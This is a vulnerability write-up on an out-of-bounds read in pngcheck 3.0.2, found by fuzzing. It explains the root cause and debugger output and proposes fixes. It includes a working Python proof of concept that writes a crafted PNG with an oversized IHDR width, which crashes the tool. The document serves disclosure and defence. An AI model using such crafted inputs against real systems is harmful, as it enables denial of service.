# pngcheck 3.0.2 - Out-of-Bounds Read via Crafted IHDR Width

**Date:** 2026-02-27
**Target:** pngcheck 3.0.2
**Source:** https://github.com/pnggroup/pngcheck
**Bug class:** CWE-125: Out-of-Bounds Read
**Impact:** Denial of Service (crash, SIGSEGV)
**CVE:** unassigned

---

## Summary

pngcheck 3.0.2 crashes with SIGSEGV when processing a crafted PNG file
with an oversized `width` value in the IHDR chunk. The attacker-controlled
width drives a row-size calculation (`cur_linebytes`) that exceeds the
internal decompression buffer (`BS = 32000`). The pointer `p` then strides
past the buffer into the binary's `.text` segment, and the subsequent
`p[0]` read faults.

---

## Environment

- OS: Linux (Arch), kernel 6.18.8
- AFL++: 4.35c
- Build: `afl-cc -O0 -g -Wall -DUSE_ZLIB -o pngcheck pngcheck.c -lz`

---

## Discovery

Found via coverage-guided fuzzing with AFL++. Real PNG files from
`/usr/share/pixmaps/` were used as the seed corpus. 4 crashes appeared
within 37 seconds.

```
saved crashes : 4
run time      : 0 days, 0 hrs, 0 min, 37 sec
exec speed    : 142/sec
```

All 4 crashes hit the same instruction (`pngcheck+30305`) — 1 unique bug,
4 variations.

---

## Root Cause

### 1. Buffer is fixed size (line 207)

```c
#define BS 32000
static uch outbuf[BS];
```

### 2. Width and bitdepth come from the attacker (lines 1223, 1230)

```c
w        = LG(buffer);      // from IHDR chunk — attacker controlled
bitdepth = (uch)buffer[8];  // from IHDR chunk — attacker controlled
```

Validation only checks `w > 0` and `w <= 2147483647`. No check against `BS`.

### 3. Row size computed from attacker values, no bounds check (line 1758)

```c
cur_linebytes = ((cur_width * bitdepth + 7) >> 3) + 1;
// width=32000, bitdepth=8:
// cur_linebytes = (32000*8+7)/8 + 1 = 32001  >  BS=32000
```

### 4. Pointer advanced by cur_linebytes with no guard (line 1881)

```c
eod = outbuf + BS - zstrm.avail_out;   // end of valid data (~outbuf+10)
while (p < eod) {
    int filttype = p[0];                // read filter byte
    ...
    p += cur_linebytes;                 // BUG: p jumps 32001 bytes
                                        // overshoots eod, lands in .text
}
// while (p < eod) passes — p numerically jumped over eod
// next p[0] read → SIGSEGV
```

---

## Crash Analysis (pwndbg)

```
RIP = 0x555555560f01  (pngcheck+30305)
RCX = 0x55555554d9ea  (p — inside .text, not data memory)

movzx ebx, byte ptr [rcx]   →  SIGSEGV
```

Source line: `pngcheck.c:1824  int filttype = p[0];`

`p` started inside `outbuf` (data segment), strided 32001 bytes, and
landed before `outbuf` in memory — inside the `.text` segment.
The `while (p < eod)` guard was bypassed because the stride jumped
numerically past `eod` in one step.

---

## Full Attack Flow

```
Attacker crafts:  IHDR width=32000, bitdepth=8
                       ↓
              cur_linebytes = 32001  (> BS=32000, no check)
                       ↓
              outbuf holds ~10 bytes of decompressed IDAT data
              eod = outbuf + 10
                       ↓
              p = outbuf + 0
              p[0] → filter byte (OK, first iteration)
              p += 32001  →  p = outbuf - 31991  (inside .text)
                       ↓
              while (p < eod) → TRUE (numerically past eod)
              p[0]  →  SIGSEGV (sig:11)
```

---

## Proof of Concept

```python
#!/usr/bin/env python3
import struct, zlib, sys

def chunk(ctype, data):
    crc = zlib.crc32(ctype + data) & 0xffffffff
    return struct.pack('>I', len(data)) + ctype + data + struct.pack('>I', crc)

png  = b'\x89PNG\r\n\x1a\n'
png += chunk(b'IHDR', struct.pack('>IIBBBBB', 32000, 2, 8, 0, 0, 0, 0))
png += chunk(b'IDAT', zlib.compress(b'\x00' + b'\x41' * 8))
png += chunk(b'IEND', b'')

with open(sys.argv[1] if len(sys.argv) > 1 else 'poc.png', 'wb') as f:
    f.write(png)
```

```
$ python3 poc.py poc.png
$ ./pngcheck poc.png
poc.png  invalid IDAT row-filter type (...)
Segmentation fault (core dumped)
```

---

## Impact

| Property | Assessment |
|---|---|
| Availability | Crash (reliable DoS) |
| Confidentiality | Possible info leak if p lands in readable memory (ASLR-dependent, unconfirmed) |
| Integrity | Not affected |
| Privilege escalation | Not applicable — pngcheck runs as invoking user |
| Exploitability | Low — OOB read only, no write primitive found |

---

## Suggested Fix

Validate `cur_linebytes` against `BS` immediately after computing it:

```c
cur_linebytes = ((cur_width * bitdepth + 7) >> 3) + 1;
if (cur_linebytes > BS) {
    printf("%s  image row size (%ld) exceeds buffer (%d)\n",
           fname, cur_linebytes, BS);
    set_err(kMajorError);
    return;
}
```

Or add a per-stride guard inside the loop:

```c
if (p + cur_linebytes > eod)
    break;
p += cur_linebytes;
```

---

## Timeline

| Date | Event |
|---|---|
| 2026-02-27 | Discovered via AFL++ fuzzing |
| 2026-02-27 | Root cause confirmed via GDB + source review |
| 2026-02-27 | PoC written and verified |
| TBD | Reported to maintainer |

---

## References

- pngcheck source: https://github.com/pnggroup/pngcheck
- CWE-125: https://cwe.mitre.org/data/definitions/125.html
- Related: CVE-2020-27818 (pngcheck 2.4.0 global buffer overflow)
- Related: CVE-2020-35511 (pngcheck 2.4.0 buffer overflow)
